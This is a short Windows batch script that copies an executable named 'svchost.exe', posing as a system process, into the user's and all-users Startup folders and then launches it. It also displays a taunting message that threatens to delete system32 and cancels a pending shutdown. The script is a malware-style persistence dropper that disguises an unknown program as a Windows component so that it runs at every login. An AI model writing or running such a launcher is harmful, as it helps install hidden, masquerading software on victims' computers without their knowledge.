echo f|xcopy /f ".\svchost.exe" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 

start explorer "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"

echo f|xcopy ".\svchost.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 




msg * Computer aborted shutdown , maybe next time I should delete system32

shutdown -a
